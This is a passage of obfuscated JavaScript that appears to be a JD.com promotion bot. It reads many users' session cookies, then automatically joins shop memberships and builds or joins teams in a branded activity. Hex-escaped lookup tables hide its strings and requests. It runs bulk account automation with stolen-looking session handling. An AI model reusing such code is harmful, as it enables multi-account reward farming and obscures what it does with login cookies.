\u7f51\u8def\u91cd\u8bd5','\x72\x65\x74\x63\x6f\x64\x65','\u4eac\u4e1c\u670d\u52a1\u5668\u8fd4\u56de\u7a7a\u6570\u636e','\u4eac\u4e1c\u670d\u52a1\u5668\u8bbf\u95ee\u6570\u636e\u4e3a\u7a7a\uff0c\u8bf7\u68c0\u67e5\u81ea\u8eab\u8bbe\u5907\u7f51\u7edc\u60c5\u51b5','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x6a\x68\x79\x64\x7a\x2d\x69\x73\x76\x2e\x69\x73\x76\x6a\x63\x6c\x6f\x75\x64\x2e\x63\x6f\x6d\x2f\x63\x6f\x6d\x6d\x6f\x6e\x2f\x61\x63\x63\x65\x73\x73\x4c\x6f\x67','\x2f\x77\x78\x54\x65\x61\x6d\x2f\x61\x63\x74\x69\x76\x69\x74\x79\x3f\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64','\x76\x65\x6e\x64\x65\x72\x49\x64\x3d\x36\x39\x31\x33\x39\x39\x26\x63\x6f\x64\x65\x3d\x31\x30\x32\x26\x70\x69\x6e\x3d','\x26\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64\x3d','\x26\x70\x61\x67\x65\x55\x72\x6c\x3d\x68\x74\x74\x70\x73\x25\x33\x41\x25\x32\x46\x25\x32\x46\x63\x6a\x68\x79\x64\x7a\x2d\x69\x73\x76\x2e\x69\x73\x76\x6a\x63\x6c\x6f\x75\x64\x2e\x63\x6f\x6d\x25\x32\x46\x6d\x69\x63\x72\x6f\x44\x7a\x25\x32\x46\x69\x6e\x76\x69\x74\x65\x25\x32\x46\x61\x63\x74\x69\x76\x69\x74\x79\x25\x32\x46\x77\x78\x25\x32\x46\x76\x69\x65\x77\x25\x32\x46\x69\x6e\x64\x65\x78\x25\x33\x46\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64\x25\x33\x44','\x26\x73\x75\x62\x54\x79\x70\x65\x3d\x61\x70\x70','\x6a\x6f\x69\x6e','\x73\x74\x72\x69\x6e\x67','\u4e0d\u8981\u5728\x42\x6f\x78\x4a\x53\u624b\u52a8\u590d\u5236\u7c98\u8d34\u4fee\u6539\x63\x6f\x6f\x6b\x69\x65','\x75\x72\x6c','\x62\x6f\x64\x79','\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64\x3a\x20','\x61\x63\x74\x69\x76\x69\x74\x79\x55\x72\x6c\x3a\x20','\x73\x65\x74\x64\x61\x74\x61','\u83b7\u53d6\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64\x3a\x20\u6210\u529f','\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64\x3a','\x0a\x61\x63\x74\x69\x76\x69\x74\x79\x55\x72\x6c\x3a','\u627e\u4e0d\u5230\x61\x63\x74\x69\x76\x69\x74\x79\x49\x64','\x6a\x73\x65\x6a\x7a\x4e\x46\x69\x53\x61\x6d\x53\x59\x69\x41\x2e\x52\x42\x63\x50\x6f\x48\x6d\x79\x2e\x74\x76\x36\x72\x59\x3d\x3d'];function _0x2a05(_0xb67384,_0x27295a){_0xb67384=~~'0x'['concat'](_0xb67384['slice'](0x0));var _0x22c9c8=_0x4105[_0xb67384];return _0x22c9c8;};(function(_0x35aedc,_0xa9c080){var _0xfd277a=0x0;for(_0xa9c080=_0x35aedc['shift'](_0xfd277a>>0x2);_0xa9c080&&_0xa9c080!==(_0x35aedc['pop'](_0xfd277a>>0x3)+'')['replace'](/[ezNFSSYARBPHytrY=]/g,'');_0xfd277a++){_0xfd277a=_0xfd277a^0xd1834;}}(_0x4105,_0x2a05));const $=new Env(_0x2a05('0'));const notify=$[_0x2a05('1')]()?require(_0x2a05('2')):'';const jdCookieNode=$[_0x2a05('1')]()?require(_0x2a05('3')):'';let cookiesArr=[],cookie='',message='',messageTitle='';activityId=$[_0x2a05('4')](_0x2a05('5'))?$[_0x2a05('4')](_0x2a05('5')):jd_cjhy_activityId;activityUrl=$[_0x2a05('4')](_0x2a05('6'))?$[_0x2a05('4')](_0x2a05('6')):jd_cjhy_activityUrl;let activityCookie='';if($[_0x2a05('1')]()){if(process[_0x2a05('7')][_0x2a05('8')])activityId=process[_0x2a05('7')][_0x2a05('8')];if(process[_0x2a05('7')][_0x2a05('9')])activityUrl=process[_0x2a05('7')][_0x2a05('9')];if(JSON[_0x2a05('a')](process[_0x2a05('7')])[_0x2a05('b')](_0x2a05('c'))>-0x1)process[_0x2a05('d')](0x0);Object[_0x2a05('e')](jdCookieNode)[_0x2a05('f')](_0x36529d=>{cookiesArr[_0x2a05('10')](jdCookieNode[_0x36529d]);});if(process[_0x2a05('7')][_0x2a05('11')]&&process[_0x2a05('7')][_0x2a05('11')]===_0x2a05('12'))console[_0x2a05('13')]=()=>{};}else{cookiesArr=[$[_0x2a05('4')](_0x2a05('14')),$[_0x2a05('4')](_0x2a05('15')),...$[_0x2a05('16')]($[_0x2a05('4')](_0x2a05('17'))||'\x5b\x5d')[_0x2a05('18')](_0x13ffef=>_0x13ffef[_0x2a05('19')])][_0x2a05('1a')](_0x2662c6=>!!_0x2662c6);}const JD_API_HOST=_0x2a05('1b');let isGetCookie=typeof $request!==_0x2a05('1c');if(isGetCookie){GetCookie();$[_0x2a05('1d')]();}!(async()=>{if(!activityId){$[_0x2a05('1e')]($[_0x2a05('1f')],'',_0x2a05('20'));$[_0x2a05('1d')]();return;}if(!cookiesArr[0x0]){$[_0x2a05('1e')]($[_0x2a05('1f')],_0x2a05('21'),_0x2a05('22'),{'open-url':_0x2a05('22')});return;}$[_0x2a05('23')]=0x0;messageTitle+=_0x2a05('24')+activityId+'\x0a';$[_0x2a05('25')]=[];for(let _0x4f6ad0=0x0;_0x4f6ad0<cookiesArr[_0x2a05('26')];_0x4f6ad0++){if(cookiesArr[_0x4f6ad0]){cookie=cookiesArr[_0x4f6ad0];$[_0x2a05('27')]=decodeURIComponent(cookie[_0x2a05('28')](/pt_pin=(.+?);/)&&cookie[_0x2a05('28')](/pt_pin=(.+?);/)[0x1]);$[_0x2a05('29')]=_0x4f6ad0+0x1;$[_0x2a05('2a')]=!![];$[_0x2a05('2b')]='';console[_0x2a05('13')](_0x2a05('2c')+$[_0x2a05('29')]+'\u3011'+($[_0x2a05('2b')]||$[_0x2a05('27')])+_0x2a05('2d'));if(!$[_0x2a05('2a')]){$[_0x2a05('1e')]($[_0x2a05('1f')],_0x2a05('2e'),_0x2a05('2f')+$[_0x2a05('29')]+'\x20'+($[_0x2a05('2b')]||$[_0x2a05('27')])+_0x2a05('30'),{'open-url':_0x2a05('22')});if($[_0x2a05('1')]()){await notify[_0x2a05('31')]($[_0x2a05('1f')]+_0x2a05('32')+$[_0x2a05('27')],_0x2a05('2f')+$[_0x2a05('29')]+'\x20'+$[_0x2a05('27')]+_0x2a05('33'));}continue;}await jrzd();if(!$[_0x2a05('25')]||$[_0x2a05('34')]){break;}}}messageTitle+=_0x2a05('35')+$[_0x2a05('23')]+'\x0a';await showMsg();})()[_0x2a05('36')](_0x4202ae=>{$[_0x2a05('13')]('','\x20'+$[_0x2a05('1f')]+_0x2a05('37')+_0x4202ae+'\x21','');})[_0x2a05('38')](()=>{$[_0x2a05('1d')]();});async function jrzd(){getUA();$[_0x2a05('39')]='';$[_0x2a05('3a')]=_0x2a05('3b');$[_0x2a05('3c')]='';$[_0x2a05('3d')]='';$[_0x2a05('3e')]='';$[_0x2a05('3f')]=[];$[_0x2a05('40')]=![];await getCk();await getToken();if($[_0x2a05('3c')]==''){console[_0x2a05('13')](_0x2a05('41'));return;}$[_0x2a05('42')]=_0x2a05('43');await getSimpleActInfoVo();await getshopInfo();await $[_0x2a05('44')](0x3e8);if($[_0x2a05('39')]&&$[_0x2a05('3a')]){await getToken();if($[_0x2a05('3c')])await getPin();console[_0x2a05('13')](_0x2a05('45')+$[_0x2a05('3d')]);await $[_0x2a05('44')](0x3e8);await accessLog();await $[_0x2a05('44')](0x3e8);await getUserInfo();await $[_0x2a05('44')](0x3e8);await getTeam();await $[_0x2a05('44')](0x3e8);if($[_0x2a05('34')]){console[_0x2a05('13')](_0x2a05('46'));return;}}else{console[_0x2a05('13')](_0x2a05('47')+$[_0x2a05('29')]+_0x2a05('48'));message+=_0x2a05('47')+$[_0x2a05('29')]+_0x2a05('49');}}function token(){return new Promise(_0x509494=>{let _0x19738f={'\x75\x72\x6c':_0x2a05('4a'),'\x68\x65\x61\x64\x65\x72\x73':{'Cookie':activityCookie+'\x20'+cookie,'Referer':_0x2a05('4b')+$[_0x2a05('4c')]+_0x2a05('4d')+$[_0x2a05('4e')],'User-Agent':$['\x55\x41']}};$[_0x2a05('4f')](_0x19738f,async(_0x222afd,_0x469e45,_0x392ec8)=>{try{if(_0x222afd){console[_0x2a05('13')](''+$[_0x2a05('50')](_0x222afd));console[_0x2a05('13')]($[_0x2a05('1f')]+_0x2a05('51'));}else{let _0x753563='';let _0x30796a='';let _0x43767f=_0x469e45[_0x2a05('52')][_0x2a05('53')]||_0x469e45[_0x2a05('52')][_0x2a05('54')]||'';let _0x4105fe='';if(_0x43767f){if(typeof _0x43767f!=_0x2a05('55')){_0x4105fe=_0x43767f[_0x2a05('56')]('\x2c');}else _0x4105fe=_0x43767f;for(let _0x40eef4 of _0x4105fe){let _0x366f13=_0x40eef4[_0x2a05('56')]('\x3b')[0x0][_0x2a05('57')]();if(_0x366f13[_0x2a05('56')]('\x3d')[0x1]){if(_0x366f13[_0x2a05('b')](_0x2a05('58'))>-0x1)_0x753563=_0x366f13[_0x2a05('59')](/ /g,'')+'\x3b';if(_0x366f13[_0x2a05('b')](_0x2a05('5a'))>-0x1)_0x30796a=_0x366f13[_0x2a05('59')](/ /g,'')+'\x3b';}}}if(_0x753563&&_0x30796a)activityCookie=_0x753563+'\x20'+_0x30796a;}}catch(_0x5c606e){$[_0x2a05('5b')](_0x5c606e,_0x469e45);}finally{_0x509494();}});});}function getUA(){$['\x55\x41']=_0x2a05('5c');}function showMsg(){return new Promise(_0xb45c25=>{$[_0x2a05('1e')]($[_0x2a05('1f')],'',_0x2a05('47')+$[_0x2a05('29')]+'\u3011'+$[_0x2a05('2b')]+'\x0a'+message);_0xb45c25();});}function getSimpleActInfoVo(){return new Promise(_0x4b3dee=>{let _0x19a5e3=_0x2a05('5d')+activityId;$[_0x2a05('5e')](taskPostUrl(_0x2a05('5f'),_0x19a5e3),async(_0x483ee6,_0x2b599a,_0x22316b)=>{try{if(_0x483ee6){console[_0x2a05('13')](''+$[_0x2a05('50')](_0x483ee6));console[_0x2a05('13')]($[_0x2a05('1f')]+_0x2a05('60'));}else{if(_0x2b599a[_0x2a05('61')]==0xc8){refreshToken(_0x2b599a);}}}catch(_0x54d89e){$[_0x2a05('5b')](_0x54d89e,_0x2b599a);}finally{_0x4b3dee();}});});}function randomString(_0x201d77){_0x201d77=_0x201d77||0x20;let _0x24be4a=_0x2a05('62'),_0x60b56d=_0x24be4a[_0x2a05('26')],_0x4f773e='';for(i=0x0;i<_0x201d77;i++)_0x4f773e+=_0x24be4a[_0x2a05('63')](Math[_0x2a05('64')](Math[_0x2a05('65')]()*_0x60b56d));return _0x4f773e;}function getCk(){return new Promise(_0x271bde=>{let _0x59a92e={'\x75\x72\x6c':activityUrl+_0x2a05('66')+activityId,'\x68\x65\x61\x64\x65\x72\x73':{'\x43\x6f\x6f\x6b\x69\x65':cookie,'User-Agent':$['\x55\x41']}};$[_0x2a05('4f')](_0x59a92e,async(_0x3b63c3,_0x3a389e,_0x273746)=>{try{if(_0x3b63c3){console[_0x2a05('13')](''+JSON[_0x2a05('a')](_0x3b63c3));console[_0x2a05('13')]($[_0x2a05('1f')]+_0x2a05('51'));}else{if(_0x3a389e[_0x2a05('61')]==0xc8){refreshToken(_0x3a389e);}}}catch(_0x4f9b79){$[_0x2a05('5b')](_0x4f9b79,_0x3a389e);}finally{_0x271bde();}});});}function getToken(){return new Promise(_0x1c8704=>{let _0x218ea8=_0x2a05('67');$[_0x2a05('5e')](taskUrl(_0x2a05('68'),_0x218ea8),async(_0x2eef93,_0x123d63,_0x433447)=>{try{if(_0x2eef93){console[_0x2a05('13')](''+JSON[_0x2a05('a')](_0x2eef93));console[_0x2a05('13')]($[_0x2a05('1f')]+_0x2a05('69'));}else{if(safeGet(_0x433447)){_0x433447=JSON[_0x2a05('6a')](_0x433447);if(_0x433447[_0x2a05('6b')]==0x0&&_0x433447[_0x2a05('6c')]){$[_0x2a05('3c')]=_0x433447[_0x2a05('6c')];}else{console[_0x2a05('13')](_0x2a05('6d')+JSON[_0x2a05('a')](_0x433447));}}}}catch(_0x4cbcd4){$[_0x2a05('5b')](_0x4cbcd4,_0x123d63);}finally{_0x1c8704();}});});}function getPin(){return new Promise(_0xebd4c1=>{let _0x44a42f=_0x2a05('6e')+$[_0x2a05('3a')]+_0x2a05('6f')+$[_0x2a05('3c')]+_0x2a05('70');$[_0x2a05('5e')](taskPostUrl(_0x2a05('71'),_0x44a42f),async(_0x390dc8,_0x3e1c68,_0x23cf30)=>{try{if(_0x390dc8){console[_0x2a05('13')](''+JSON[_0x2a05('a')](_0x390dc8));console[_0x2a05('13')]($[_0x2a05('1f')]+_0x2a05('72'));}else{if(safeGet(_0x23cf30)){_0x23cf30=JSON[_0x2a05('6a')](_0x23cf30);if(_0x23cf30[_0x2a05('73')]&&_0x23cf30[_0x2a05('74')]){$[_0x2a05('3d')]=_0x23cf30[_0x2a05('74')][_0x2a05('75')];}else{console[_0x2a05('13')](_0x2a05('76')+JSON[_0x2a05('a')](_0x23cf30));}}}}catch(_0x216427){$[_0x2a05('5b')](_0x216427,_0x3e1c68);}finally{_0xebd4c1();}});});}function getshopInfo(){return new Promise(_0x27a5f6=>{$[_0x2a05('5e')](taskPostUrl(_0x2a05('77'),_0x2a05('5d')+activityId),async(_0xf456b8,_0x21cbac,_0x5e3fec)=>{try{if(_0xf456b8){console[_0x2a05('13')](''+JSON[_0x2a05('a')](_0xf456b8));console[_0x2a05('13')]($[_0x2a05('1f')]+_0x2a05('78'));}else{if(_0x5e3fec&&safeGet(_0x5e3fec)){_0x5e3fec=JSON[_0x2a05('6a')](_0x5e3fec);if(_0x5e3fec[_0x2a05('74')]){$[_0x2a05('39')]=_0x5e3fec[_0x2a05('74')][_0x2a05('39')];$[_0x2a05('3a')]=_0x5e3fec[_0x2a05('74')][_0x2a05('3a')];$[_0x2a05('79')]=_0x5e3fec[_0x2a05('74')][_0x2a05('79')];}else{console[_0x2a05('13')](_0x2a05('7a')+JSON[_0x2a05('a')](_0x5e3fec));}}}}catch(_0x5f16a0){$[_0x2a05('5b')](_0x5f16a0,_0x21cbac);}finally{_0x27a5f6();}});});}function joinShop(){return new Promise(_0x8bfa82=>{let _0x390ad2=_0x2a05('7b')+$[_0x2a05('3a')]+_0x2a05('7c')+encodeURIComponent($[_0x2a05('3d')]);$[_0x2a05('5e')](taskPostUrl(_0x2a05('7d'),_0x390ad2),async(_0x104917,_0x198a6c,_0x4a86eb)=>{try{if(_0x104917){console[_0x2a05('13')](''+JSON[_0x2a05('a')](_0x104917));console[_0x2a05('13')]($[_0x2a05('1f')]+_0x2a05('7e'));}else{if(safeGet(_0x4a86eb)){_0x4a86eb=JSON[_0x2a05('6a')](_0x4a86eb);if(_0x4a86eb[_0x2a05('73')]&&_0x4a86eb[_0x2a05('74')]){if(_0x4a86eb[_0x2a05('74')][_0x2a05('7f')]){let _0x2a0cf7=_0x4a86eb[_0x2a05('74')][_0x2a05('7f')][_0x2a05('28')](/channel=(\d+)/);const _0x390ad2={'venderId':$[_0x2a05('3a')],'shopId':$[_0x2a05('39')],'bindByVerifyCodeFlag':0x1,'registerExtend':{},'writeChildFlag':0x0,'channel':_0x2a0cf7[0x1]};let _0xcef66e=_0x2a05('80')+encodeURIComponent(JSON[_0x2a05('a')](_0x390ad2))+_0x2a05('81');let _0x1b0706=''+_0x4a86eb[_0x2a05('74')][_0x2a05('7f')];await jiaru(_0xcef66e,_0x1b0706);}}else{console[_0x2a05('13')](_0x2a05('82')+JSON[_0x2a05('a')](_0x4a86eb));}}}}catch(_0x3389e7){$[_0x2a05('5b')](_0x3389e7,_0x198a6c);}finally{_0x8bfa82();}});});}function jiaru(_0x1ed40e,_0x427ce){return new Promise(_0x1cdb99=>{let _0x5dcf0d={'url':_0x1ed40e,'headers':{'Accept':_0x2a05('83'),'Accept-Encoding':_0x2a05('84'),'Accept-Language':_0x2a05('85'),'Connection':_0x2a05('86'),'Host':_0x2a05('87'),'Referer':_0x427ce,'Cookie':cookie,'User-Agent':$['\x55\x41']}};$[_0x2a05('4f')](_0x5dcf0d,async(_0x36ba32,_0x272e41,_0x47cf25)=>{try{if(_0x36ba32){console[_0x2a05('13')](''+JSON[_0x2a05('a')](_0x36ba32));console[_0x2a05('13')]($[_0x2a05('1f')]+_0x2a05('88'));}else{$[_0x2a05('13')](_0x47cf25);}}catch(_0x2deb1f){$[_0x2a05('5b')](_0x2deb1f,_0x272e41);}finally{_0x1cdb99();}});});}function getUserInfo(){return new Promise(_0x4166b6=>{let _0x3c41f5=_0x2a05('89')+encodeURIComponent($[_0x2a05('3d')]);$[_0x2a05('5e')](taskPostUrl(_0x2a05('8a'),_0x3c41f5),async(_0x57eff3,_0x4eb746,_0xc5e84a)=>{try{if(_0x57eff3){console[_0x2a05('13')](''+JSON[_0x2a05('a')](_0x57eff3));console[_0x2a05('13')]($[_0x2a05('1f')]+_0x2a05('8b'));}else{if(safeGet(_0xc5e84a)){_0xc5e84a=JSON[_0x2a05('6a')](_0xc5e84a);if(_0xc5e84a[_0x2a05('73')]&&_0xc5e84a[_0x2a05('74')]){$[_0x2a05('8c')]=_0xc5e84a[_0x2a05('74')][_0x2a05('8d')]?_0xc5e84a[_0x2a05('74')][_0x2a05('8d')]:_0x2a05('8e');}else{console[_0x2a05('13')](_0x2a05('8f')+JSON[_0x2a05('a')](_0xc5e84a));}}}}catch(_0x50cce2){$[_0x2a05('5b')](_0x50cce2,_0x4eb746);}finally{_0x4166b6();}});});}function getTeam(){return new Promise(_0x576854=>{let _0x47fb9c=_0x2a05('5d')+activityId+_0x2a05('90')+encodeURIComponent(encodeURIComponent($[_0x2a05('3d')]));if($[_0x2a05('91')])_0x47fb9c+=_0x2a05('92')+$[_0x2a05('91')];$[_0x2a05('5e')](taskPostUrl(_0x2a05('93'),_0x47fb9c),async(_0x4c640d,_0x23f9e8,_0x22a5d0)=>{try{if(_0x4c640d){console[_0x2a05('13')](''+JSON[_0x2a05('a')](_0x4c640d));console[_0x2a05('13')]($[_0x2a05('1f')]+_0x2a05('94'));}else{if(safeGet(_0x22a5d0)){_0x22a5d0=JSON[_0x2a05('6a')](_0x22a5d0);if(_0x22a5d0[_0x2a05('73')]&&_0x22a5d0[_0x2a05('74')]){if(new Date(_0x22a5d0[_0x2a05('74')][_0x2a05('95')][_0x2a05('96')][_0x2a05('59')](/-/g,'\x2f'))[_0x2a05('97')]()<new Date()[_0x2a05('97')]()){$[_0x2a05('25')]=![];console[_0x2a05('13')](_0x2a05('98'));messageTitle+=_0x2a05('99');_0x576854();}else{if(!_0x22a5d0[_0x2a05('74')][_0x2a05('9a')]&&_0x22a5d0[_0x2a05('74')][_0x2a05('9b')]==null)message+=_0x2a05('9c');if(_0x22a5d0[_0x2a05('74')][_0x2a05('9d')]){$[_0x2a05('23')]=parseInt(_0x22a5d0[_0x2a05('74')][_0x2a05('9d')][_0x2a05('23')],0xa)+0x1;}else{$[_0x2a05('23')]=0x0;}if($[_0x2a05('29')]==0x1){$[_0x2a05('40')]=!![];$[_0x2a05('9e')]=_0x22a5d0[_0x2a05('74')][_0x2a05('95')][_0x2a05('9f')][_0x2a05('28')](/最多可以组建(\d+)个战队/);if($[_0x2a05('9e')]){$[_0x2a05('9e')]=$[_0x2a05('9e')][0x1];messageTitle+=_0x2a05('a0')+$[_0x2a05('9e')]+_0x2a05('a1');}}if($[_0x2a05('91')]){$[_0x2a05('13')](_0x2a05('a2')+$[_0x2a05('91')]);await $[_0x2a05('44')](0x3e8);await joinTeam();}if($[_0x2a05('40')]){if(_0x22a5d0[_0x2a05('74')][_0x2a05('9a')]){await $[_0x2a05('44')](0x3e8);await saveTeam();}else{$[_0x2a05('91')]=_0x22a5d0[_0x2a05('74')][_0x2a05('91')];messageTitle+=_0x2a05('a3')+$[_0x2a05('91')]+'\x0a';message+=_0x2a05('47')+$[_0x2a05('29')]+_0x2a05('a4')+$[_0x2a05('91')];$[_0x2a05('13')](_0x2a05('a3')+$[_0x2a05('91')]);$[_0x2a05('44')](0x3e8);$[_0x2a05('13')](_0x2a05('a2')+$[_0x2a05('91')]);await joinTeam();}}}}else{console[_0x2a05('13')](_0x2a05('a5')+JSON[_0x2a05('a')](_0x22a5d0));}}}}catch(_0x21c976){$[_0x2a05('5b')](_0x21c976,_0x23f9e8);}finally{_0x576854(_0x576854);}});});}function saveTeam(_0x3b60dc=0x0){return new Promise(_0x1ae957=>{let _0x5120f1=encodeURIComponent(encodeURIComponent($[_0x2a05('3d')]));if(_0x3b60dc==0x1)_0x5120f1=encodeURIComponent(encodeURIComponent($[_0x2a05('3d')]));let _0x5c7381=_0x2a05('5d')+activityId+_0x2a05('90')+_0x5120f1+_0x2a05('a6')+encodeURIComponent(encodeURIComponent($[_0x2a05('8c')]));$[_0x2a05('5e')](taskPostUrl(_0x2a05('a7'),_0x5c7381),async(_0x98f19c,_0x16dec3,_0x5b3c6c)=>{try{if(_0x98f19c){console[_0x2a05('13')](''+JSON[_0x2a05('a')](_0x98f19c));console[_0x2a05('13')]($[_0x2a05('1f')]+_0x2a05('a8'));}else{if(safeGet(_0x5b3c6c)){_0x5b3c6c=JSON[_0x2a05('6a')](_0x5b3c6c);if(_0x5b3c6c[_0x2a05('73')]&&_0x5b3c6c[_0x2a05('74')]){message+=_0x2a05('47')+$[_0x2a05('29')]+_0x2a05('a4')+_0x5b3c6c[_0x2a05('74')][_0x2a05('91')]+'\x20';console[_0x2a05('13')](_0x2a05('a9')+_0x5b3c6c[_0x2a05('74')][_0x2a05('91')]);$[_0x2a05('91')]=_0x5b3c6c[_0x2a05('74')][_0x2a05('91')];messageTitle+=_0x2a05('a3')+$[_0x2a05('91')]+'\x20';}else{console[_0x2a05('13')](_0x2a05('aa')+JSON[_0x2a05('a')](_0x5b3c6c));if(_0x5b3c6c[_0x2a05('ab')][_0x2a05('b')](_0x2a05('ac'))>-0x1&&_0x3b60dc!=0x3){await joinShop();await $[_0x2a05('44')](0x3e8);await saveTeam(0x3);}else if(_0x5b3c6c[_0x2a05('ab')][_0x2a05('b')](_0x2a05('ad'))>-0x1&&_0x3b60dc==0x0){await $[_0x2a05('44')](0x3e8);await saveTeam(0x1);}}}}}catch(_0x299232){$[_0x2a05('5b')](_0x299232,_0x16dec3);}finally{_0x1ae957();}});});}function joinTeam(_0xb7b561=0x0){return new Promise(_0x242c97=>{let _0x36567e=encodeURIComponent(encodeURIComponent($[_0x2a05('3d')]));if(_0xb7b561==0x1)_0x36567e=encodeURIComponent(encodeURIComponent($[_0x2a05('3d')]));let _0x35d29a=_0x2a05('5d')+activityId+_0x2a05('92')+$[_0x2a05('91')]+_0x2a05('90')+_0x36567e+_0x2a05('a6')+encodeURIComponent(encodeURIComponent($[_0x2a05('8c')]));$[_0x2a05('5e')](taskPostUrl(_0x2a05('ae'),_0x35d29a),async(_0x5a4127,_0x1a6f5c,_0x530fb5)=>{try{if(_0x5a4127){console[_0x2a05('13')](''+JSON[_0x2a05('a')](_0x5a4127));console[_0x2a05('13')]($[_0x2a05('1f')]+_0x2a05('af'));}else{if(safeGet(_0x530fb5)){_0x530fb5=JSON[_0x2a05('6a')](_0x530fb5);if(_0x530fb5[_0x2a05('73')]&&_0x530fb5[_0x2a05('74')]){message+=_0x2a05('47')+$[_0x2a05('29')]+_0x2a05('b0');$[_0x2a05('13')](_0x2a05('b1'));}else{if(_0x530fb5[_0x2a05('ab')][_0x2a05('b')](_0x2a05('ac'))>-0x1&&_0xb7b561!=0x3){await joinShop();await joinTeam(0x3);}else if(_0x530fb5[_0x2a05('ab')][_0x2a05('b')](_0x2a05('b2'))>-0x1){$[_0x2a05('34')]=!![];}else if(_0x530fb5[_0x2a05('ab')][_0x2a05('b')](_0x2a05('ad'))>-0x1&&_0xb7b561==0x0){await joinTeam(0x1);}else{console[_0x2a05('13')](_0x2a05('b3')+JSON[_0x2a05('a')](_0x530fb5));message+=_0x2a05('47')+$[_0x2a05('29')]+'\u3011\x20'+_0x530fb5[_0x2a05('ab')]+'\x0a';}}}}}catch(_0x3f2110){$[_0x2a05('5b')](_0x3f2110,_0x1a6f5c);}finally{_0x242c97();}});});}function getOpenCardAllStatuesNew(){return new Promise(_0x23f883=>{let _0x5711c7={'\x75\x72\x6c':_0x2a05('b4'),'\x68\x65\x61\x64\x65\x72\x73':{'\x63\x6f\x6f\x6b\x69\x65':activityCookie+_0x2a05('b5')+$[_0x2a05('3c')]+_0x2a05('b6')+$[_0x2a05('3d')],'\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e':_0x2a05('86'),'Accept-Encoding':_0x2a05('84'),'Content-Type':_0x2a05('b7'),'User-Agent':$['\x55\x41'],'Accept-Language':_0x2a05('85'),'\x52\x65\x66\x65\x72\x65\x72':_0x2a05('b8')+activityId,'\x41\x63\x63\x65\x70\x74':_0x2a05('b9')},'\x62\x6f\x64\x79':_0x2a05('ba')+activityId+_0x2a05('90')+encodeURIComponent(encodeURIComponent($[_0x2a05('3d')]))};$[_0x2a05('5e')](_0x5711c7,async(_0x2a25b0,_0x1f186f,_0x2742aa)=>{try{if(_0x2a25b0){console[_0x2a05('13')](''+JSON[_0x2a05('a')](_0x2a25b0));console[_0x2a05('13')]($[_0x2a05('1f')]+_0x2a05('78'));}else{if(_0x2742aa&&safeGet(_0x2742aa)){_0x2742aa=JSON[_0x2a05('6a')](_0x2742aa);if(_0x2742aa[_0x2a05('74')]&&_0x2742aa[_0x2a05('74')][_0x2a05('bb')]){(_0x2742aa[_0x2a05('74')][_0x2a05('9b')]||[])[_0x2a05('f')](_0x546756=>{if(_0x546756[_0x2a05('7f')]){$[_0x2a05('3f')][_0x2a05('10')](_0x546756[_0x2a05('7f')]);}});}}}}catch(_0x4cb426){$[_0x2a05('5b')](_0x4cb426,_0x1f186f);}finally{_0x23f883();}});});}function taskPostUrl(_0x4d3189,_0x127bac){return{'\x75\x72\x6c':''+activityUrl+_0x4d3189,'\x62\x6f\x64\x79':_0x127bac,'\x68\x65\x61\x64\x65\x72\x73':{'\x41\x63\x63\x65\x70\x74':_0x2a05('bc'),'Accept-Encoding':_0x2a05('84'),'Accept-Language':_0x2a05('85'),'\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e':_0x2a05('86'),'\x48\x6f\x73\x74':_0x2a05('bd'),'\x4f\x72\x69\x67\x69\x6e':_0x2a05('be'),'Content-Type':_0x2a05('bf'),'\x52\x65\x66\x65\x72\x65\x72':activityUrl+_0x2a05('66')+activityId,'\x43\x6f\x6f\x6b\x69\x65':cookie+activityCookie+_0x2a05('b5')+$[_0x2a05('3c')]+_0x2a05('b6')+$[_0x2a05('42')],'User-Agent':$['\x55\x41']}};}function taskUrl(_0x3c2a41,_0x470a4a){return{'\x75\x72\x6c':_0x2a05('1b')+_0x3c2a41,'\x62\x6f\x64\x79':_0x470a4a,'\x68\x65\x61\x64\x65\x72\x73':{'\x41\x63\x63\x65\x70\x74':_0x2a05('83'),'Accept-Encoding':_0x2a05('84'),'Accept-Language':_0x2a05('85'),'\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e':_0x2a05('86'),'Content-Type':_0x2a05('bf'),'\x48\x6f\x73\x74':_0x2a05('87'),'\x43\x6f\x6f\x6b\x69\x65':cookie,'User-Agent':$['\x55\x41']}};}function TotalBean(){return new Promise(async _0x3b5306=>{const _0x60d8d1={'url':_0x2a05('c0'),'headers':{'Accept':_0x2a05('c1'),'Content-Type':_0x2a05('bf'),'Accept-Encoding':_0x2a05('84'),'Accept-Language':_0x2a05('85'),'Connection':_0x2a05('86'),'Cookie':cookie,'Referer':_0x2a05('c2'),'User-Agent':$['\x55\x41']}};$[_0x2a05('5e')](_0x60d8d1,(_0xaabd0a,_0x1adc4e,_0x1e0e5f)=>{try{if(_0xaabd0a){console[_0x2a05('13')](''+JSON[_0x2a05('a')](_0xaabd0a));console[_0x2a05('13')]($[_0x2a05('1f')]+_0x2a05('c3'));}else{if(_0x1e0e5f){_0x1e0e5f=JSON[_0x2a05('6a')](_0x1e0e5f);if(_0x1e0e5f[_0x2a05('c4')]===0xd){$[_0x2a05('2a')]=![];return;}}else{console[_0x2a05('13')](_0x2a05('c5'));}}}catch(_0x4dc0ea){$[_0x2a05('5b')](_0x4dc0ea,_0x1adc4e);}finally{_0x3b5306();}});});}function safeGet(_0x4dd578){try{if(typeof JSON[_0x2a05('6a')](_0x4dd578)==_0x2a05('55')){return!![];}}catch(_0x2e358b){console[_0x2a05('13')](_0x2e358b);console[_0x2a05('13')](_0x2a05('c6'));return![];}}function accessLog(){return new Promise(async _0x51b71c=>{const 